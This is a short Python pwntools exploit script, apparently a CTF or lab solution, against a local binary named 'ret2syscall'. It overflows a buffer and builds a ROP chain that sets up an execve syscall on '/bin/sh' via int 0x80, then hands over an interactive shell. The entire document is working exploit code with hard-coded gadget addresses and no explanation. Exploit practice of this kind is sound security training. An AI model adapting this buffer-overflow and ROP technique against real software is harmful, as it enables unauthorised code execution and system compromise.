from pwn import *

p = process("./ret2syscall")
gdb.attach(p,"b *0x080488ED")

# ROPgadget --binary ./ret2syscall --string "/bin/sh"
binsh = 0x080ea068
# ROPgadget --binary ./ret2syscall --only "int"
int_0x80 = 0x0806ce55
# 
pop_eax_ret = 0x080b8526
pop_edx_ecx_ebx_ret = 0x0806f200

eax = 11 # #define __NR_ execve 11
ebx = binsh
ecx = 0
edx = 0

p.recvuntil("ret2syscall\n")
payload = "a" * 0x108 + "junk"
payload += p32(pop_eax_ret) + p32(eax)
payload += p32(pop_edx_ecx_ebx_ret) + p32(edx) + p32(ecx) + p32(ebx)
payload += p32(int_0x80)
p.sendline(payload)
p.interactive()
